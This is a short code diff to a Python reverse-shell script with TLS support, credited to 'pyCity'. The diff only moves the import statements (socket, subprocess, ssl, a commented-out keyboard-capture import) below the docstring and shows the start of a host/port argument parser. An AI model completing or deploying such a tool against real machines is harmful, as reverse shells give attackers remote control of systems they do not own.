@@ -1,12 +1,5 @@
 #!/usr/bin/env python3
-import socket
-import subprocess
-import os
-import time
-import argparse
-import ssl
-import sys
-#import pynput.keyboard
+
 """
 Author       - pyCity
 Date         - 1/22/2019
@@ -18,6 +11,14 @@ Description: - Reverse shell in python 3. Has TLS functionality using
              - a DHE-RSA-AES256-SHA256 cipher.
 """
 
+import socket
+import subprocess
+import os
+import time
+import argparse
+import ssl
+import sys
+#import pynput.keyboard
 
 def parse_args():
     """Define host and port variables with optional ssl"""
